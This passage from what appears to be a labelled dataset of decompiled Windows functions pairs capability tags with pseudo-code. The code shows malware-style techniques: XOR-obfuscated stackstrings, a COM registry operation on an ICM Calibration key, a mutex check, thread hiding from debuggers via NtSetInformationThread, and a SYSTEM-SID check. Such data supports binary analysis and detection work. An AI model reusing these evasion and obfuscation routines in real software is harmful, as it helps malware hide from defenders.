str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[11] ^ 0x33;\n        var_108h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[12] ^ 0x33;\n        var_106h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[13] ^ 0x33;\n        var_104h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[14] ^ 0x33;\n        uVar2 = 0;\n        do {\n            *(&var_14ah + uVar2 * 2 + 2) = *(&var_14ah + uVar2 * 2 + 2) ^ 0x33;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0x23);\n        var_fah = 0x210072;\n        var_102h = 0;\n        var_f6h = 0x14001d;\n        var_f2h = 0x50006;\n        var_7eh = CONCAT22(*0x42430c, *0x42430a) ^ 0x720072;\n        var_eeh = 0x13;\n        var_eah = 0x2e0017;\n        var_7ah = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[0], *0x42430e) ^ 0x720072;\n        var_e6h = 0x1b003f;\n        var_e2h = 0x11;\n        var_76h = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[2], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[1]) ^\n                  0x720072;\n        var_deh = 0x1001d;\n        var_dah = 0x14001d;\n        var_72h = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[4], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[3]) ^\n                  0x720072;\n        var_d6h = 0x2e0006;\n        var_d2h = 0x1b0025;\n        var_6eh = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[6], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[5]) ^\n                  0x720072;\n        var_ceh = 0x16001c;\n        var_cah = 0x5001d;\n        var_6ah = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[8], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[7]) ^\n                  0x720072;\n        var_c6h = 0x520001;\n        var_c2h = 0x26003c;\n        var_66h = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[10], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[9]) ^\n                  0x720072;\n        var_beh = 0x31002e;\n        var_bah = 7;\n        var_b6h = 0x170000;\n        var_b2h = 0x6001c;\n        var_aeh = 0x170024;\n        var_aah = 0x10000;\n        var_a6h = 0x1d001b;\n        var_a2h = 0x2e001c;\n        var_9eh = 0x31003b;\n        var_9ah = 0x2e003f;\n        var_96h = 0x130031;\n        var_92h = 0x1b001e;\n        var_8eh = 0x10;\n        var_8ah = 0x60013;\n        var_86h = 0x1d001b;\n        var_82h = 0x72001c;\n        var_62h = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[12], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[11]) ^\n                  0x720072;\n        var_5eh = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[14], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[13]) ^\n                  0x720072;\n        var_5ah = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[16], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[15]) ^\n                  0x720072;\n        var_56h = CONCAT22(str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[18], str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[17]) ^\n                  0x720072;\n        var_52h._0_2_ = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[19] ^ 0x72;\n        var_52h._2_2_ = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[20] ^ 0x72;\n        var_4eh = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[21] ^ 0x72;\n        var_4ch = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[22] ^ 0x72;\n        var_4ah = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[23] ^ 0x72;\n        var_48h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[24] ^ 0x72;\n        var_46h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[25] ^ 0x72;\n        var_44h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[26] ^ 0x72;\n        var_42h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[27] ^ 0x72;\n        var_40h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[28] ^ 0x72;\n        var_3eh = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[29] ^ 0x72;\n        var_3ch = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[30] ^ 0x72;\n        var_3ah = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[31] ^ 0x72;\n        var_38h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[32] ^ 0x72;\n        var_36h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[33] ^ 0x72;\n        var_34h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[34] ^ 0x72;\n        var_32h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[35] ^ 0x72;\n        var_30h = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[36] ^ 0x72;\n        var_2eh = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[37] ^ 0x72;\n        var_2ch = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[38] ^ 0x72;\n        var_2ah = *0x42435e ^ 0x72;\n        var_28h = *0x424360 ^ 0x72;\n        var_26h = *0x424362 ^ 0x72;\n        var_24h = *0x424364 ^ 0x72;\n        var_22h = *0x424366 ^ 0x72;\n        var_20h = *0x424368 ^ 0x72;\n        var_1eh = *0x42436a ^ 0x72;\n        var_1ch = *0x42436c ^ 0x72;\n        var_1ah = *0x42436e ^ 0x72;\n        var_18h = *0x424370 ^ 0x72;\n        var_16h = *0x424372 ^ 0x72;\n        var_14h = *0x424374 ^ 0x72;\n        var_12h = *0x424376 ^ 0x72;\n        var_10h = *0x424378 ^ 0x72;\n        var_eh = *0x42437a ^ 0x72;\n        var_ch = *0x42437c ^ 0x72;\n        var_ah = *0x42437e ^ 0x72;\n        var_8h = *0x424380 ^ 0x72;\n        uVar2 = 0;\n        do {\n            *(&var_fah + uVar2 * 2 + 2) = *(&var_fah + uVar2 * 2 + 2) ^ 0x72;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0x79);\n        var_6h = 0;\n        uVar2 = (**(*var_100h + 0x28))(var_100h, 0x80000002, &var_fah + 2, &var_14ah + 2, param_1);\n        if (-1 < uVar2) {\n            var_a2h = 0x430038;\n            var_52h._0_2_ = *0x42435e ^ 0x38;\n            var_9eh = 0xa007c;\n            var_52h._2_2_ = *0x424360 ^ 0x38;\n            var_9ah = 0xf007d;\n            var_4eh = *0x424362 ^ 0x38;\n            var_96h = 0xc0008;\n            var_4ch = *0x424364 ^ 0x38;\n            var_92h = 0x7a0009;\n            var_4ah = *0x424366 ^ 0x38;\n            var_8eh = 0xa0015;\n            var_48h = *0x424368 ^ 0x38;\n            var_8ah = 0xa0001;\n            var_46h = *0x42436a ^ 0x38;\n            var_86h = 0x15000f;\n            var_44h = *0x42436c ^ 0x38;\n            var_82h = 0xa000c;\n            var_42h = *0x42436e ^ 0x38;\n            var_7eh = 0x5a005e;\n            var_40h = *0x424370 ^ 0x38;\n            var_7ah = 0x15;\n            var_3eh = *0x424372 ^ 0x38;\n            var_76h = 0x1007d;\n            var_3ch = *0x424374 ^ 0x38;\n            var_72h = 0x15007e;\n            var_3ah = *0x424376 ^ 0x38;\n            var_6eh = 0x7b000f;\n            var_38h = *0x424378 ^ 0x38;\n            var_6ah = 0x1007d;\n            var_36h = *0x42437a ^ 0x38;\n            var_66h = 0x7a000b;\n            var_34h = *0x42437c ^ 0x38;\n            var_62h = 0x7c000e;\n            var_32h = *0x42437e ^ 0x38;\n            var_5eh = 0x1007b;\n            var_30h = *0x424380 ^ 0x38;\n            var_5ah = 0xf000b;\n            var_2eh = *0x424382 ^ 0x38;\n            var_56h = 0x380045;\n            var_2ch = *0x424384 ^ 0x38;\n            var_2ah = *0x424386 ^ 0x38;\n            var_28h = *0x424388 ^ 0x38;\n            var_26h = *0x42438a ^ 0x38;\n            var_24h = *0x42438c ^ 0x38;\n            var_22h = *0x42438e ^ 0x38;\n            var_20h = *0x424390 ^ 0x38;\n            var_1eh = *0x424392 ^ 0x38;\n            var_1ch = *0x424394 ^ 0x38;\n            var_1ah = str.:sbcs._0_2_ ^ 0x38;\n            var_18h = str.:sbcs._2_2_ ^ 0x38;\n            var_16h = str.:sbcs._4_2_ ^ 0x38;\n            var_14h = *0x42439c ^ 0x38;\n            var_12h = *0x42439e ^ 0x38;\n            var_10h = *0x4243a0 ^ 0x38;\n            var_eh = *0x4243a2 ^ 0x38;\n            var_ch = *0x4243a4 ^ 0x38;\n            var_ah = *0x4243a6 ^ 0x38;\n            var_8h = *0x4243a8 ^ 0x38;\n            uVar2 = 0;\n            do {\n                *(&var_a2h + uVar2 * 2 + 2) = *(&var_a2h + uVar2 * 2 + 2) ^ 0x38;\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < 0x4d);\n            var_6h = 0;\n            uVar2 = fcn.0041e7e0(4, &var_4h);\n            if (uVar2 == 0) {\n                if (var_4h == NULL) {\n                    uVar2 = 0x8007000e;\n                }\n                else {\n                    uVar2 = (**(*var_4h + 0x38))(var_4h, 0);\n                }\n            }\n        }\n    }\n    if (var_100h != NULL) {\n        (**(*var_100h + 8))(var_100h);\n    }\ncode_r0x0041fa4e:\n    if (var_4h != NULL) {\n        (**(*var_4h + 8))(var_4h);\n    }\n    if (iVar1 == 0) {\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return ~uVar2 >> 0x1f;\n}\n",
        "token_count": 6539
    },
    "00401130": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401130(uint16_t *param_1, uint32_t param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    while( true ) {\n        uVar1 = *param_1;\n        if (uVar1 == 0) break;\n        cVar2 = uVar1 + -0x20;\n        if (uVar1 < 0x61) {\n            cVar2 = uVar1;\n        }\n        param_1 = param_1 + 1;\n        param_2 = cVar2 + (param_2 >> 0xd | param_2 << 0x13);\n    }\n    return param_2;\n}\n",
        "token_count": 157
    },
    "00409990": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409990(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_29h;\n    uint uStack41;\n    uint uStack37;\n    uint uStack33;\n    uint var_19h;\n    uint var_15h;\n    uint uStack21;\n    uint uStack17;\n    uint uStack13;\n    uint var_5h;\n    \n    uVar7 = 0;\n    var_15h = *0x424d90;\n    uStack21 = *0x424d94;\n    uStack17 = *0x424d98;\n    uStack13 = *0x424d9c;\n    do {\n        var_15h._0_1_ = *0x424d90;\n        puVar1 = &var_15h + uVar7 + 1;\n        *puVar1 = *puVar1 ^ var_15h;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0xf);\n    uVar7 = 0;\n    var_5h._0_1_ = 0;\n    var_29h = *0x424550;\n    uStack41 = *0x424554;\n    uStack37 = *0x424558;\n    uStack33 = *0x42455c;\n    do {\n        var_29h._0_1_ = *0x424550;\n        puVar1 = &var_29h + uVar7 + 1;\n        *puVar1 = *puVar1 ^ var_29h;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0xf);\n    var_19h._0_1_ = 0;\n    _var_3ch = &var_15h + 1 << 0x20;\n    _var_4ch = ZEXT816(0);\n    _var_5ch = ZEXT816(0x409a9000000000);\n    iVar5 = (*_sym.imp.USER32.dll_RegisterClassA)(&var_5ch);\n    if ((iVar5 != 0) &&\n       (iVar6 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (0x200, &var_15h + 1, &var_29h + 1, 0xcf0000, 0x80000000, 0x80000000, 0xf0, 0x78, 0, 0, 0, 0)\n       ,  pcVar2 = _sym.imp.USER32.dll_GetMessageA,  iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageA)(&var_34h, 0, 0, 0);\n        pcVar4 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar3 = _sym.imp.USER32.dll_DispatchMessageA;\n        while (iVar6 != 0) {\n            (*pcVar4)(&var_34h);\n            (*pcVar3)(&var_34h);\n            iVar6 = (*pcVar2)(&var_34h, 0, 0, 0);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 828
    },
    "0040cc20": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040cc20(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_1eh;\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    uint var_eh;\n    uchar lpModuleName;\n    uchar var_9h;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uint var_4h;\n    \n    if (*0x429320 == NULL) {\n        uVar4 = 0;\n        var_1eh = *0x424dd0;\n        uStack30 = *0x424dd4;\n        uStack26 = *0x424dd8;\n        uStack22 = *0x424ddc;\n        var_eh._0_2_ = 0x49;\n        do {\n            var_1eh._0_1_ = *0x424dd0;\n            puVar1 = &var_1eh + uVar4 + 1;\n            *puVar1 = *puVar1 ^ var_1eh;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x10);\n        var_eh._0_2_ = var_eh & 0xff;\n        var_eh._3_1_ = 0x14;\n        var_5h = 0;\n        lpModuleName = 0x6e;\n        var_6h = 0x6c;\n        var_9h = 0x74;\n        var_8h = 100;\n        var_7h = 0x6c;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_1eh + 1);\n        *0x429320 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        if (*0x429320 == NULL) {\n            iVar3 = (*_sym.imp.ntdll.dll_RtlCreateUserThread)\n                              (0xffffffff, 0, 0, 0, 0, 0, param_1, param_2, &var_4h, &var_eh + 2);\n            goto code_r0x0040ccee;\n        }\n    }\n    iVar3 = (**0x429320)(&var_4h, 0x1fffff, 0, 0xffffffff, param_1, param_2, 0, 0, 0x1000, 0x1000, 0);\ncode_r0x0040ccee:\n    if (iVar3 != 0) {\n        return 0xffffffff;\n    }\n    (*_sym.imp.ntdll.dll_NtSetInformationThread)(var_4h, 0x11, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 662
    },
    "0040d040": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d040(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_5eh;\n    uint uStack94;\n    uint uStack90;\n    uint uStack86;\n    uint var_4eh;\n    uint uStack78;\n    uint uStack74;\n    uint uStack70;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_36h;\n    uint var_32h;\n    uint8_t var_2eh [3];\n    uint uStack47;\n    uint uStack43;\n    uint uStack39;\n    uint var_1fh;\n    uint uStack31;\n    uint uStack27;\n    uint uStack23;\n    uint var_fh;\n    uint var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    uVar3 = 0;\n    var_5eh = *0x424730;\n    uStack94 = *0x424734;\n    uStack90 = *0x424738;\n    uStack86 = *0x42473c;\n    var_3eh = 0x52262339;\n    var_4eh = *0x424740;\n    uStack78 = *0x424744;\n    uStack74 = *0x424748;\n    uStack70 = *0x42474c;\n    var_3ah = 0x212d2755;\n    var_36h = 0x23242122;\n    var_32h._0_2_ = 0x6950;\n    do {\n        var_5eh._0_1_ = *0x424730;\n        puVar1 = &var_5eh + uVar3 + 1;\n        *puVar1 = *puVar1 ^ var_5eh;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0x2d);\n    uVar3 = 0;\n    stack0xffffffcd = *0x424da0;\n    uStack47 = *0x424da4;\n    uStack43 = *0x424da8;\n    uStack39 = *0x424dac;\n    var_32h._2_1_ = 0;\n    var_1fh = *0x424db0;\n    uStack31 = *0x424db4;\n    uStack27 = *0x424db8;\n    uStack23 = *0x424dbc;\n    var_fh = 0x704071c;\n    var_bh = 0x9010072;\n    var_7h = 0x5017400;\n    var_3h._0_2_ = 0x4c72;\n    do {\n        var_32h._3_1_ = *0x424da0;\n        var_2eh[uVar3] = var_2eh[uVar3] ^ var_32h._3_1_;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0x2d);\n    var_3h._2_1_ = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, var_2eh);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, var_2eh);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 788
    },
    "00407f70": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data using SHA224",
            "hash data using SHA256"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407f70(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    bool bVar9;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar9 = arg_ch != 0;\n    *arg_8h = 0;\n    uVar6 = 0x1f83d9ab;\n    arg_8h[1] = 0;\n    uVar7 = 0x510e527f;\n    uVar1 = 0xbb67ae85;\n    if (bVar9) {\n        uVar1 = 0x367cd507;\n    }\n    uVar4 = 0xa54ff53a;\n    uVar2 = 0x3c6ef372;\n    if (bVar9) {\n        uVar2 = 0x3070dd17;\n    }\n    uVar5 = 0x5be0cd19;\n    if (bVar9) {\n        uVar6 = 0x64f98fa7;\n    }\n    uVar8 = 0x9b05688c;\n    if (bVar9) {\n        uVar8 = 0x68581511;\n        uVar7 = 0xffc00b31;\n        uVar5 = 0xbefa4fa4;\n    }\n    if (arg_ch != 0) {\n        uVar4 = 0xf70e5939;\n    }\n    uVar3 = 0x6a09e667;\n    if (arg_ch != 0) {\n        uVar3 = 0xc1059ed8;\n    }\n    arg_8h[2] = uVar3;\n    arg_8h[3] = uVar1;\n    arg_8h[4] = uVar2;\n    arg_8h[5] = uVar4;\n    arg_8h[6] = uVar7;\n    arg_8h[7] = uVar8;\n    arg_8h[8] = uVar6;\n    arg_8h[9] = uVar5;\n    arg_8h[0x1a] = arg_ch;\n    return 0;\n}\n",
        "token_count": 540
    },
    "0040cd60": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cd60(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(param_1);\n    return;\n}\n",
        "token_count": 37
    },
    "0040d210": {
        "rules": [
            "contain obfuscated stackstrings",
            "link function at runtime on Windows",
            "create new key via CryptAcquireContext",
            "generate random numbers via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d210(uint pbBuffer, uint dwLen)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint lpProcName;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint lpLibFileName;\n    uint var_ch;\n    ushort var_8h;\n    uint var_6h;\n    \n    var_78h = 0x69004d;\n    var_24h._0_2_ = 0;\n    var_6h._0_1_ = 0;\n    var_74h = 0x720063;\n    var_70h = 0x73006f;\n    var_6ch = 0x66006f;\n    var_68h = 0x200074;\n    var_64h = 0x610042;\n    var_60h = 0x650073;\n    var_5ch = 0x430020;\n    var_58h = 0x790072;\n    var_54h = 0x740070;\n    var_50h = 0x67006f;\n    var_4ch = 0x610072;\n    var_48h = 0x680070;\n    var_44h = 0x630069;\n    var_40h = 0x500020;\n    var_3ch = 0x6f0072;\n    var_38h = 0x690076;\n    var_34h = 0x650064;\n    var_30h = 0x200072;\n    var_2ch = 0x310076;\n    var_28h = 0x30002e;\n    lpLibFileName = 0x79726362;\n    var_ch = 0x642e7470;\n    var_8h = 0x6c6c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&var_6h + 2, 0, &var_78h, 1, 0xf0000000);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    else {\n        lpProcName = str.BCryptGenRandom._0_4_;\n        uStack32 = str.BCryptGenRandom._4_4_;\n        uStack28 = str.BCryptGenRandom._8_4_;\n        uStack24 = str.BCryptGenRandom._12_4_;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, &lpProcName);\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, pbBuffer, dwLen, 2);\n            return 1;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&var_6h + 2, 0, &var_78h, 1, 0xf0000000);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(stack0xfffffff8, dwLen, pbBuffer);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(stack0xfffffff8, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 936
    },
    "0041be00": {
        "rules": [
            "compare security identifiers"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041be00(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_60h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h._0_2_ = 0x500;\n    iVar1 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(var_4h, 1, &var_60h, 0x4c, &var_ch);\n        if (iVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n            iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&var_14h, 1, 0x12, 0, 0, 0, 0, 0, 0, 0, &var_8h);\n            if (iVar1 != 0) {\n                uVar2 = (*_sym.imp.ADVAPI32.dll_EqualSid)(var_60h, var_8h);\n                (*_sym.imp.ADVAPI32.dll_FreeSid)(var_8h);\n                return uVar2;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 359
    },
    "00409550": {
        "rules": [
            "encrypt data using AES via x86 extensions"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409771)\n// WARNING: Removing unreachable block (ram,0x00409765)\n// WARNING: Removing unreachable block (ram,0x00409752)\n// WARNING: Removing unreachable block (ram,0x00409737)\n// WARNING: Removing unreachable block (ram,0x0040972b)\n// WARNING: Removing unreachable block (ram,0x00409718)\n// WARNING: Removing unreachable block (ram,0x004096fd)\n// WARNING: Removing unreachable block (ram,0x004096f1)\n// WARNING: Removing unreachable block (ram,0x004096e1)\n// WARNING: Removing unreachable block (ram,0x004096c6)\n// WARNING: Removing unreachable block (ram,0x004096ba)\n// WARNING: Removing unreachable block (ram,0x004096ae)\n// WARNING: Removing unreachable block (ram,0x0040968f)\n// WARNING: Removing unreachable block (ram,0x00409683)\n// WARNING: Removing unreachable block (ram,0x00409673)\n// WARNING: Removing unreachable block (ram,0x00409658)\n// WARNING: Removing unreachable block (ram,0x0040964c)\n// WARNING: Removing unreachable block (ram,0x0040963c)\n// WARNING: Removing unreachable block (ram,0x00409621)\n// WARNING: Removing unreachable block (ram,0x00409615)\n// WARNING: Removing unreachable block (ram,0x00409605)\n// WARNING: Removing unreachable block (ram,0x004095ea)\n// WARNING: Removing unreachable block (ram,0x004095de)\n// WARNING: Removing unreachable block (ram,0x004095ce)\n// WARNING: Removing unreachable block (ram,0x004095b3)\n// WARNING: Removing unreachable block (ram,0x004095a7)\n// WARNING: Removing unreachable block (ram,0x00409597)\n// WARNING: Removing unreachable block (ram,0x0040957c)\n// WARNING: Removing unreachable block (ram,0x00409570)\n// WARNING: Removing unreachable block (ram,0x00409561)\n\nvoid __fastcall fcn.00409550(uchar (*param_1) [16], uchar (*param_2) [16])\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint uVar3;\n    \n    auVar2 = *param_2;\n    auVar1 = aeskeygenassist(auVar2, 1);\n    uVar3 = SUB164(auVar1 >> 0x60, 0);\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    *param_1 = auVar2;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 2);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[1] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 4);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[2] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 8);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[3] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x10);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[4] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 